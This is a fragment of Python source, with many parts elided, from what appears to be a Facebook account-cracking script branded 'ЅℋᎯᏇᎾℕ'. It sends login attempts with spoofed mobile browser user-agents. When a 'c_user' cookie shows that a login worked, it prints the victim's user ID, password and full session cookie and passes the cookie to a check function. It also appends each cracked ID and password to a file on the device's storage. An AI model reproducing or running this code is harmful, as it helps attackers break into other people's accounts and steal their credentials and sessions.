...
ha = current.day
today = date.today()
#ЅℋᎯᏇᎾℕ2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mЅℋᎯᏇᎾℕ')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-ЅℋᎯᏇᎾℕ/1.2.0 OPN-B'
...
'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio ЅℋᎯᏇᎾℕ_OK.mp3")
                print('\033[1;92m[ЅℋᎯᏇᎾℕ-OK] '+uid+' | '+ps+'\033[0;97m')
                #print(f'{B}[NUMBER] {K}'+uid+'  ')
                print(f'{B}[COOKIE] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ЅℋᎯᏇᎾℕ-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mЅℋᎯᏇᎾℕ","\x1b[1;92mЅℋᎯᏇᎾℕ","\x1b[1;93mЅℋᎯᏇᎾℕ","\x1b[1;94mЅℋᎯᏇᎾℕ","\x1b[1;95mЅℋᎯᏇᎾℕ","\x1b[1;96mЅℋᎯᏇᎾℕ","\x1b[1;97mЅℋᎯᏇᎾℕ","\x1b[1;91mЅℋᎯᏇᎾℕ","\x1b[1;92mЅℋᎯᏇᎾℕ","\x1b[1;93mЅℋᎯᏇᎾℕ","\x1b[1;94mЅℋᎯᏇᎾℕ","\x1b[1;95mЅℋᎯᏇᎾℕ","\x1b[1;96mЅℋᎯᏇᎾℕ"])
